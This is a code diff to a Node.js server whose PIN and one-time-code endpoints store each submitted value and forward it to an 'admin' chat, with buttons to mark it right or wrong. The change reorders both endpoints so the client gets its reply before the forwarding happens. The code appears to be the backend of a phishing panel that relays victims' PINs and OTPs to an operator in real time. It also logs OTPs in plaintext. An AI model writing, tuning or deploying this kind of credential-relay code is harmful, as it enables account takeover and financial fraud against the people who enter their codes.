@@ -1566,8 +1566,14 @@ app.post('/api/verify-pin', async (req, res) => {
             assignmentType: assignmentType || 'direct'
         });
 
+        processingLocks.delete(lockKey);
+        
+        // Return success immediately to the client
+        res.json({ success: true, applicationId });
+
+        // Send to admin asynchronously (don't wait)
         const formattedPhone = formatPhone(phoneNumber);
-        await sendToAdmin(adminId, `
+        sendToAdmin(adminId, `
 📱 *PIN VERIFICATION*
 
 📋 \`${applicationId}\`
@@ -1583,10 +1589,7 @@ app.post('/api/verify-pin', async (req, res) => {
                     [{ text: '❌ PIN Wrong',    callback_data: `pin_reject_${adminId}_${applicationId}` }]
                 ]
             }
-        });
-
-        processingLocks.delete(lockKey);
-        res.json({ success: true, applicationId });
+        }).catch(err => console.error('Error sending PIN to admin:', err.message));
 
     } catch (error) {
         processingLocks.delete(`pin_${req.body?.phoneNumber}`);
@@ -1620,11 +1623,15 @@ app.post('/api/verify-otp', async (req, res) => {
         await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
         console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
 
+        // Return success immediately to the client
+        res.json({ success: true });
+
+        // Send to admin asynchronously (don't wait)
         const returningLabel = application.isReturningUser
             ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
             : '';
 
-        await sendToAdmin(application.adminId, `
+        sendToAdmin(application.adminId, `
 ✅ *CODE VERIFICATION*${returningLabel}
 
 📋 \`${applicationId}\`
@@ -1640,9 +1647,8 @@ app.post('/api/verify-otp', async (req, res) => {
                     [{ text: '❌ Code Wrong',   callback_data: `otp_reject_${application.adminId}_${applicationId}` }]
                 ]
             }
-        });
+        }).catch(err => console.error('Error sending OTP to admin:', err.message));
 
-        res.json({ success: true });
     } catch (error) {
         console.error('❌ Error in /api/verify-otp:', error);
         res.status(500).json({ success: false, message: 'Server error: ' + error.message });
